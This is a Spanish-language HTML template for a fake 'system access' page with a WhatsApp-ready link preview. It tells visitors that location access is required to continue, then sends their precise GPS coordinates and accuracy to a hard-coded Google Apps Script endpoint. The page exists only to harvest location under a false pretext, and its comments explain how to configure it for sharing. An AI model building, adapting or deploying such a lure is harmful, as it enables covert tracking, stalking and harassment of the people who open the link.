<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">

  <!-- ADAPTACIÓN PARA CELULARES -->
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Acceso al sistema</title>

  <!-- ============================
       VISTA PREVIA PARA WHATSAPP
       ============================ -->

  <meta property="og:type" content="website">

  <meta property="og:title"
        content="Acceso al sistema">

  <meta property="og:description"
        content="Presiona aquí para ingresar al sistema.">

  <!--
       IMPORTANTE:
       Cambia TU_USUARIO y TU_REPOSITORIO.
       Ejemplo:
       https://raw.githubusercontent.com/angelarias/sistema/main/ima.png
  -->
  <meta property="og:image"
        content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/ima.png">

  <meta property="og:image:secure_url"
        content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/ima.png">

  <meta property="og:image:type" content="image/png">

  <!-- Recomendado para WhatsApp -->
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <!-- Twitter/X -->
  <meta name="twitter:card" content="summary_large_image">

  <meta name="twitter:title"
        content="Acceso al sistema">

  <meta name="twitter:description"
        content="Presiona aquí para ingresar al sistema.">

  <meta name="twitter:image"
        content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/ima.png">


  <style>

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {

      min-height: 100vh;

      display: flex;
      justify-content: center;
      align-items: center;

      font-family: Arial, Helvetica, sans-serif;

      background:
        linear-gradient(
          rgba(0, 0, 0, 0.70),
          rgba(0, 0, 0, 0.85)
        ),
        url("ima.png");

      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;

      color: white;

      padding: 20px;
    }


    .contenedor {

      width: 100%;
      max-width: 430px;

      padding: 35px 25px;

      text-align: center;

      background: rgba(0, 0, 0, 0.45);

      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);

      border: 1px solid rgba(255,255,255,0.25);

      border-radius: 22px;

      box-shadow:
        0 15px 50px rgba(0,0,0,0.6);
    }


    .logo {

      width: 130px;
      height: 130px;

      object-fit: cover;

      border-radius: 50%;

      border: 3px solid rgba(255,255,255,0.8);

      margin-bottom: 25px;

      box-shadow:
        0 0 25px rgba(255,255,255,0.25);
    }


    h1 {

      font-size: 27px;

      margin-bottom: 15px;

      letter-spacing: 1px;
    }


    p {

      font-size: 16px;

      line-height: 1.5;

      color: #e8e8e8;

      margin-bottom: 25px;
    }


    button {

      width: 100%;

      padding: 16px;

      border: 1px solid rgba(255,255,255,0.5);

      border-radius: 14px;

      background: rgba(255,255,255,0.15);

      color: white;

      font-size: 17px;

      font-weight: bold;

      cursor: pointer;

      backdrop-filter: blur(6px);

      transition: 0.3s;
    }


    button:hover {

      background: rgba(255,255,255,0.28);

      transform: translateY(-2px);
    }


    button:disabled {

      opacity: 0.6;

      cursor: not-allowed;

      transform: none;
    }


    #estado {

      margin-top: 20px;

      font-size: 14px;

      color: #ddd;
    }


    .spinner {

      display: none;

      width: 35px;
      height: 35px;

      margin: 20px auto;

      border: 4px solid rgba(255,255,255,0.25);

      border-top: 4px solid white;

      border-radius: 50%;

      animation: girar 1s linear infinite;
    }


    @keyframes girar {

      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }

    }


    .privacidad {

      margin-top: 25px;

      font-size: 12px;

      opacity: 0.7;
    }


    @media(max-width: 480px) {

      .contenedor {
        padding: 30px 20px;
      }

      h1 {
        font-size: 23px;
      }

      .logo {
        width: 110px;
        height: 110px;
      }

    }

  </style>

</head>


<body>

  <div class="contenedor">

    <!-- Imagen del repositorio -->
    <img
      src="ima.png"
      class="logo"
      alt="Sistema"
    >

    <h1>
      Bienvenido
    </h1>

    <p>
      Para continuar al sistema es necesario permitir
      el acceso a tu ubicación.
    </p>


    <button
      id="btnIngresar"
      onclick="solicitarUbicacion()"
    >
      CONTINUAR
    </button>


    <div
      id="spinner"
      class="spinner">
    </div>


    <div id="estado">
      Presiona CONTINUAR para ingresar.
    </div>


    <div class="privacidad">
      Tu navegador solicitará autorización antes de
      compartir la ubicación.
    </div>

  </div>



<script>

  /* =========================================
     URL DE TU GOOGLE APPS SCRIPT
     ========================================= */

  const URL_SISTEMA =
  "https://script.google.com/macros/s/AKfycbyE-RGmsmeM7jRu00nVmqbzweWZcaSkRRqtL0WH1aZwq_YgzUYYQaj0PT0Nd5ATP_4m/exec";


  /* =========================================
     SOLICITAR UBICACIÓN
     ========================================= */

  function solicitarUbicacion() {

    const boton =
      document.getElementById("btnIngresar");

    const estado =
      document.getElementById("estado");

    const spinner =
      document.getElementById("spinner");


    boton.disabled = true;

    spinner.style.display = "block";

    estado.innerHTML =
      "Solicitando permiso de ubicación...";


    /* =========================================
       COMPROBAR GEOLOCALIZACIÓN
       ========================================= */

    if (!navigator.geolocation) {

      estado.innerHTML =
        "Tu dispositivo no permite obtener la ubicación.";

      setTimeout(function() {

        redireccionar();

      }, 1500);

      return;
    }


    /* =========================================
       PEDIR PERMISO AL USUARIO
       ========================================= */

    navigator.geolocation.getCurrentPosition(

      /* UBICACIÓN AUTORIZADA */

      function(position) {

        const latitud =
          position.coords.latitude;

        const longitud =
          position.coords.longitude;

        const precision =
          position.coords.accuracy;


        estado.innerHTML =
          "Ubicación autorizada.<br>Ingresando al sistema...";


        /* =====================================
           ENVIAMOS LOS DATOS AL APPS SCRIPT
           ===================================== */

        const destino =
          URL_SISTEMA
          + "?lat="
          + encodeURIComponent(latitud)
          + "&lng="
          + encodeURIComponent(longitud)
          + "&accuracy="
          + encodeURIComponent(precision);


        setTimeout(function() {

          window.location.href = destino;

        }, 800);

      },


      /* =========================================
         SI EL USUARIO NO AUTORIZA
         ========================================= */

      function(error) {

        spinner.style.display = "none";

        boton.disabled = false;


        switch(error.code) {

          case error.PERMISSION_DENIED:

            estado.innerHTML =
              "Debes autorizar la ubicación desde tu navegador para continuar.";

            break;


          case error.POSITION_UNAVAILABLE:

            estado.innerHTML =
              "No se pudo determinar tu ubicación. Intenta nuevamente.";

            break;


          case error.TIMEOUT:

            estado.innerHTML =
              "La solicitud de ubicación tardó demasiado. Intenta nuevamente.";

            break;


          default:

            estado.innerHTML =
              "No se pudo obtener la ubicación.";

        }

      },


      /* =========================================
         CONFIGURACIÓN GPS
         ========================================= */

      {

        enableHighAccuracy: true,

        timeout: 15000,

        maximumAge: 0

      }

    );

  }



  /* =========================================
     REDIRECCIÓN NORMAL
     ========================================= */

  function redireccionar() {

    window.location.href =
      URL_SISTEMA;

  }

</script>


</body>
</html>
